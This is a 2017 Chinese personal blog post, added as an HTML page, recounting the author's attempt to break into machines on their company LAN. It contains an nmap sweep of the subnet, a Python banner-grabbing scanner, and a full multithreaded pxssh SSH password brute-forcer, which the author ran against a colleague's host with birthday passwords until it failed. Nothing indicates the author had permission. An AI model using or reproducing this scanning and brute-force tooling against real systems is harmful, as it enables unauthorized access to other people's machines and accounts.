@@ -1,0 +1,378 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>局域网入侵记1 | SkyRover</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Kevin">
+    
+    <meta name="description" content="我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈
+最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以入侵的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。
+第一步查看下局域网中有哪些打开的端口，祭上">
+    
+    
+    
+    
+    <link rel="alternative" href="atom.xml" title="SkyRover" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/myLogo.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/myLogo.png">
+    
+
+  
+    <link href="/css/font-awesome.min.css" rel="stylesheet">
+    
+  
+
+    <link rel="stylesheet" href="/css/style.css">
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?d182ed77fc48758bf45a33835ee35745";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+      <script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v1/st.js','_st');
+
+  _st('install','.............Add your swiftype userID...............');
+</script>
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="SkyRover">SkyRover</a></h1>
+				<h2 class="blog-motto">做我的仲夏夜之梦～</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+                    <ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">归档</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+					<li>
+					
+						<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="st-search-inpu" maxlength="20" placeholder="Search" />
+						</form>
+					
+					</li>
+                <!--<li><div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div></li>-->
+
+				</ul>
+			</nav>	
+</div>
+    </header>
+    <div id="container" class="clearfix">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/02/20/局域网入侵记1/" title="局域网入侵记1" itemprop="url">局域网入侵记1</a>
+  </h1>
+  <p class="article-time">
+    <time datetime="2017-02-20T08:52:29.000Z" itemprop="datePublished">Feb 20 2017</time>
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title"></strong>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NMAP扫描"><span class="toc-number">1.</span> <span class="toc-text">NMAP扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#获取banner"><span class="toc-number">2.</span> <span class="toc-text">获取banner</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh登录暴力猜解"><span class="toc-number">3.</span> <span class="toc-text">ssh登录暴力猜解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#破解字典"><span class="toc-number">3.1.</span> <span class="toc-text">破解字典</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始破解"><span class="toc-number">3.2.</span> <span class="toc-text">开始破解</span></a></li></ol></li></ol>
+		</div>
+		
+		<p>我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈</p>
+<p>最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以入侵的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。</p>
+<p>第一步查看下局域网中有哪些打开的端口，祭上大杀器NMAP扫描器！</p>
+<h1 id="NMAP扫描"><a href="#NMAP扫描" class="headerlink" title="NMAP扫描"></a>NMAP扫描</h1><p>使用客户端也行，命令行也行，命令：<code>nmap -p 1-65535 -T4 -A -v 192.168.0.*</code>，这里只检测TCP连接。检测很快就有结果了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Initiating SYN Stealth Scan at 16:28</div><div class="line">Scanning 8 hosts [65535 ports/host]</div><div class="line">Discovered open port 445/tcp on 192.168.0.104</div><div class="line">Discovered open port 8888/tcp on 192.168.0.101</div><div class="line">Discovered open port 8080/tcp on 192.168.0.112</div><div class="line">Discovered open port 3306/tcp on 192.168.0.117</div><div class="line">Discovered open port 22/tcp on 192.168.0.117</div><div class="line">Discovered open port 80/tcp on 192.168.0.1</div><div class="line">Discovered open port 135/tcp on 192.168.0.104</div><div class="line">Discovered open port 139/tcp on 192.168.0.104</div><div class="line">SYN Stealth Scan Timing: About 0.57% done</div></pre></td></tr></table></figure>
+<p>这里的端口逐一介绍下：</p>
+<ul>
+<li>445端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，估计是公司的可联网打印机，常用入侵端口</li>
+<li>8888端口，这个是和我合作的前端妹纸的电脑开的，是测试前端程序呢，不打搅啦</li>
+<li>8080端口，这个我发送了个GET请求 <code>/index</code>，返回了官网数据，看来是一个web服务器</li>
+<li>3306端口，这个是MySQL的默认端口，常用入侵端口</li>
+<li>22端口，ssh端口,可以用于登录</li>
+<li>80端口，是为HTTP开放的,连路由器用的</li>
+<li>135端口，Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。常用入侵端口</li>
+<li>139端口，NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。常用入侵端口</li>
+</ul>
+<p>这个<code>192.168.0.104</code>开了这么多易入侵端口，就不怕吗？我发现断了打印机的电，仍然有这个IP的存在，看来不是打印机，那会是哪台主机这么随便？</p>
+<h1 id="获取banner"><a href="#获取banner" class="headerlink" title="获取banner"></a>获取banner</h1><p>这里写了一个漏洞扫描器，也就是向每个IP，每个可能的端口发送连接请求，查看返回的banner</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line">def retBanner(ip, port):</div><div class="line">    try:</div><div class="line">        socket.setdefaulttimeout(2)</div><div class="line">        s = socket.socket()</div><div class="line">        s.connect((ip, port))</div><div class="line">        # 连接后的返回值</div><div class="line">        banner = s.recv(1024)</div><div class="line">        return banner</div><div class="line">    except:</div><div class="line">        return</div><div class="line">def checkVulns(banners, filename):</div><div class="line">    &apos;&apos;&apos;检查是否是漏洞，检查列表从文件读取&apos;&apos;&apos;</div><div class="line">    f = open(filename, &apos;r&apos;)</div><div class="line">    for line in f.readlines():</div><div class="line">        if line.strip(&apos;\n&apos;) in banners:</div><div class="line">            print(&apos;server is vulnerable:&apos; + banners.strip(&apos;\n&apos;))</div><div class="line">def main():</div><div class="line">    &apos;&apos;&apos;执行的主函数&apos;&apos;&apos;</div><div class="line">    portList = [21, 22, 25, 80, 110, 443]</div><div class="line">    for x in range(100, 150):</div><div class="line">        ip = &apos;192.168.0.&apos; + str(x)</div><div class="line">        for port in portList:</div><div class="line">            print(&quot;ip:&quot;, ip, &quot; port:&quot;, port)</div><div class="line">            banner = retBanner(ip, port)</div><div class="line">            # 如果存在返回值</div><div class="line">            if banner:</div><div class="line">                print(ip + &quot;: &quot; + banner.decode(&apos;utf-8&apos;))</div><div class="line">                # checkVulns(banner, filename)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>最后结果发现有这么几台主机开了ssh服务，可以进行远程登录，但是都需要密码，所以只好暴力猜解咯。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">ip: 192.168.0.117  port: 22</div><div class="line">192.168.0.117: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.117  port: 25</div><div class="line">ip: 192.168.0.117  port: 80</div><div class="line">ip: 192.168.0.117  port: 110</div><div class="line">ip: 192.168.0.117  port: 443</div><div class="line">ip: 192.168.0.118  port: 21</div><div class="line">ip: 192.168.0.118  port: 22</div><div class="line">192.168.0.118: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.118  port: 25</div><div class="line">ip: 192.168.0.118  port: 80</div><div class="line">ip: 192.168.0.118  port: 110</div><div class="line">ip: 192.168.0.118  port: 443</div><div class="line">ip: 192.168.0.119  port: 21</div><div class="line">ip: 192.168.0.119  port: 22</div><div class="line">192.168.0.119: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.119  port: 25</div></pre></td></tr></table></figure>
+<h1 id="ssh登录暴力猜解"><a href="#ssh登录暴力猜解" class="headerlink" title="ssh登录暴力猜解"></a>ssh登录暴力猜解</h1><h2 id="破解字典"><a href="#破解字典" class="headerlink" title="破解字典"></a>破解字典</h2><p>一个黑客能不能破解密码，主要看他的字典大不大= =</p>
+<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><p>这里是一个暴力猜解程序，使用了多线程，密码就用<code>19800101</code>以来的生日值做测试，所以大家以后不要用生日来做密码啦，很容易被破解的。</p>
+<p>使用了<code>pexpect</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line"># 安装pxssh包</div><div class="line"># wget http://pexpect.sourceforge.net/pexpect-2.3.tar.gz</div><div class="line"># tar -xzf pexpect-2.3.tar.gz</div><div class="line"># cd pexpect-2.3</div><div class="line"># sudo python setup.py install</div><div class="line">import pexpect.pxssh as pxssh</div><div class="line">import optparse</div><div class="line">import time</div><div class="line">from threading import *</div><div class="line">maxConnections = 5</div><div class="line"># 相当于可用资源数acquire -1 release +1 然后release会检查上限</div><div class="line">connection_lock = BoundedSemaphore(value=maxConnections)</div><div class="line">Found = False</div><div class="line">Fails = 0</div><div class="line"># pxssh可以用预先写好的login(),logout()和prompt()等函数直接与ssh交互</div><div class="line">def connect(host, user, password, release):</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    try:</div><div class="line">        s = pxssh.pxssh()</div><div class="line">        s.login(host, user, password)</div><div class="line">        # 如果登陆成功说明找到密码</div><div class="line">        print(&apos;[+] Password Found:&apos; + password)</div><div class="line">        Found = True</div><div class="line">    except Exception as e:</div><div class="line">        # 说明ssh服务器被大量连接刷爆了</div><div class="line">        if &apos;read_nonblocking&apos; in str(e):</div><div class="line">            Fails += 1</div><div class="line">            time.sleep(5)</div><div class="line">            connect(host, user, password, False)</div><div class="line">            # 提示符提取困难</div><div class="line">        elif &apos;synchronize with original prompt&apos; in str(e):</div><div class="line">            time.sleep(1)</div><div class="line">            connect(host, user, password, False)</div><div class="line">    finally:</div><div class="line">        if release:</div><div class="line">            connection_lock.release()</div><div class="line">def main():</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    # 一个命令行解析</div><div class="line">    parser = optparse.OptionParser(&apos;usage%prog -H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&apos;)</div><div class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;)</div><div class="line">    parser.add_option(&apos;-F&apos;, dest=&apos;passwordFile&apos;, type=&apos;string&apos;, help=&apos;specify password file&apos;)</div><div class="line">    parser.add_option(&apos;-u&apos;, dest=&apos;user&apos;, type=&apos;string&apos;, help=&apos;specify the user&apos;)</div><div class="line">    # 定义完所有参数之后开始解析传入的参数</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    # options包含所有参数</div><div class="line">    host = options.tgtHost</div><div class="line">    passwordFile = options.passwordFile</div><div class="line">    user = options.user</div><div class="line">    if host == None or passwordFile == None or user == None:</div><div class="line">        print(parser.usage)</div><div class="line">        exit(0)</div><div class="line">    fn = open(passwordFile, &apos;r&apos;)</div><div class="line">    for line in fn.readlines():</div><div class="line">        if Found:</div><div class="line">            print(&quot;Password Found&quot;)</div><div class="line">            exit(0)</div><div class="line">        if Fails &gt; 5:</div><div class="line">            print(&quot;too many socket timeouts&quot;)</div><div class="line">            exit(0)</div><div class="line">        connection_lock.acquire()</div><div class="line">        password = line.strip(&apos;\r&apos;).strip(&apos;\n&apos;)</div><div class="line">        print(&quot;Testing:&quot; + str(password))</div><div class="line">        t = Thread(target=connect, args=(host, user, password, True))</div><div class="line">        t.start()</div><div class="line">        # time.sleep(0.1)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>破解中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Testing:19940629</div><div class="line">Testing:19940630</div><div class="line">Testing:19940701</div><div class="line">Testing:19940702</div><div class="line">Testing:19940703</div></pre></td></tr></table></figure>
+<p>然并卵，破解失败。。。看来这个主机的主人机智的没有使用生日做密码。。。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/编程/">编程</a><a href="/tags/黑客/">黑客</a>
+  </div>
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/黑客/">黑客</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://microndgt.github.io/2017/02/20/局域网入侵记1/" data-title="局域网入侵记1 | SkyRover" data-tsina="null" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2017/02/19/BAIDU的DNS解析/"  title="BAIDU的DNS解析">
+ <strong>旧一篇:</strong><br/> 
+ <span>BAIDU的DNS解析
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	
+	<div class="ds-thread" data-title="局域网入侵记1" data-thread-key="局域网入侵记1" data-author-key="Kevin" data-url="http://microndgt.github.io/post/局域网入侵记1"></div>
+	
+</section>
+
+
+</div>  
+    </div>
+    <footer><div id="footer" >
+	<div class="copyright">
+		<span>Powered by <a href="https://github.com/hexojs/hexo">Hexo</a> and theme by 
+		<a href="https://github.com/levonlin/Tinnypp">Tinnypp</a>.</span>
+		
+			<span>© Kevin</span>
+		
+	<div>
+</div></footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  //back to top
+  function backToTop(){
+    var buttonHTML = $("<a href=\"#top\" id=\"back-top\">" + "<span>Back to Top</span></a>");
+    buttonHTML.appendTo($("body"));
+    var buttonToTop = $("#back-top");
+    // hide #back-top first
+    buttonToTop.hide();
+
+    // fade in #back-top
+    $(function() {
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                buttonToTop.fadeIn();
+            } else {
+                buttonToTop.fadeOut();
+            }
+        });
+        // scroll body to 0px on click
+        buttonToTop.click(function() {
+            $('body,html').animate({
+                scrollTop: 0
+            }, 800);
+            return false;
+        });
+    });
+  }
+  backToTop();
+
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      ta = $('#toc.toc-aside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+        
+    }
+  });
+
+  var show = true;
+  c.click(function(){
+    if(show == true){
+        a.addClass('fadeOut').css('display', 'none');
+        ta.css('display', 'block').addClass('fadeIn');
+        m.addClass('moveMain');  
+    }else{
+        a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');     
+        ta.css('display', 'none'); 
+        m.removeClass('moveMain');
+        $('#toc.toc-aside').css('display', 'none');
+    }
+    show = !show;
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,240-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"microndgt"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';    //change to ds.src = '/js/embed.js'; to add useragent for duoshuo
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+<script type="text/javascript">
+  function footerPosition() {
+    var contentHeight = document.documentElement.scrollHeight,
+        winHeight = window.innerHeight;
+    if(contentHeight <= winHeight) {
+      $('footer').addClass('fixed-bottom');
+    } else {
+      $('footer').removeClass('fixed-bottom');
+    }
+  }
+  footerPosition();
+  $(window).resize(footerPosition);
+</script>
+
+
+  </body>
+</html>
